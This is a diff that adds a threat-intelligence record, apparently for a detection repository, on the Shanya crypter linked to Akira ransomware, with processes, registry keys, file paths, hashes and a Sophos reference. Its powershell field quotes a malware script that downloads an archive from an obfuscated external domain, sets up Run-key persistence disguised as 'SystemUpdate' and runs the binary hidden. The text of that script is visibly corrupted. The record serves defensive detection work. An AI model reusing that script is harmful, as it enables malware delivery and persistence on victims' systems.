@@ -1,0 +1,45 @@
+description: Shanya crypter used by ransomware groups with features including AMSI
+  bypass, anti-VM, and EDR killing capabilities.
+attribution: 'null'
+malware_families:
+- Akira
+TTPs:
+  processes:
+  - cmd.exe
+  - consent.exe
+  commandline: []
+  powershell:
+  - try { BSOPHOS$zX9pl = [System.IO.Path]::GetTempPath () X-OPS$SmK4vR = Join-Path
+    $zX9pl "consent.zip"SgBTwN = "biokdslTM + "." + "com"STH2yT = "https://" + $gBTwN
+    + "/apip/f/f"# Network operation$pD67S = New-Object System.Net.WebClient$pD6jS.Headers.Add
+    ("User-Agent","PowerShell/5.1")$pD6jS.DownloadFile ($fH2yT, S$mK4vR)if (Test-Path
+    $mK4vR) {# Archive extractiontry {Add-Type -AssemblyName System.IO.Compression.FileSystem[System.TO.Compression.ZipFile]::ExtractToDirectory
+    ($mK4vR, $zX9plL)# Binary location EigPPSHOS$vJd3zM = Join-Path $zX9pl "consent.exe'if
+    (-not (Test-Path $vJd3zM)) {$vJd3zM = Join-Path $zX9pl. "consent\consent.exe"}if
+    (-not (Test-Path $vJd3zM)) {$al9kF = Get-ChildItem $zX9pl -Recurse -Name "*.exe"
+    -ErrorAction SilentlyContinueif ($aLokF) {$vJd3zM = Join-Path $zX9pl $alL9kF}}if
+    (Test-Path $vJ3zM) {# Persistence mechanism$iR6xP = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"$nC2hV
+    = "SystemUpdateSdF4sK = " "$vJ3zM """try {New-TtemProperty -Path $iR6xP -Name
+    $nC2hV -Value $dF4sK -PropertyType String} catch {}# Process executionStart-Process
+    $vJ3zM -WindowStyle Hidden -ErrorAction SilentlyContinue
+  scripting_engine: []
+  registry_keys:
+  - HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
+  image_load: []
+  network_connections: []
+  file_activity:
+  - c:\\windows\\System32\\mustarde64.dll
+  - c:\\windows\\System32\\wmp.dll
+  - c:\\windows\\System32\\hasherezade_pllll.dll
+  - c:\\windows\\System32\\shanya.dll
+  persistence:
+  - HKCU:\Software\Microsoft\Windows\CurrentVersion\Run
+  process_relations: []
+IOCs: 'hashes: [''58995a6c6042ed15f765a11160690c45f76f8271'', ''83317a42290ef8577e1980dc6085ab789dcc0c8f'',
+  ''6645297a0a423564f99b9f474b0df234d6613d04df48a94cb67f541b8eb829d1'', ''59906b022adfc6f63903adbdbb64c82881e0b1664d6b7f7ee42319019fcb3d7e'']'
+authors:
+- Gabor Szappanos
+- Steeve Gaudreault
+reference: https://news.sophos.com/en-us/2025/12/06/inside-shanya-a-packer-as-a-service-fueling-modern-attacks/
+date_of_publication: December 06, 2025
+file_creation_date: December 09, 2025
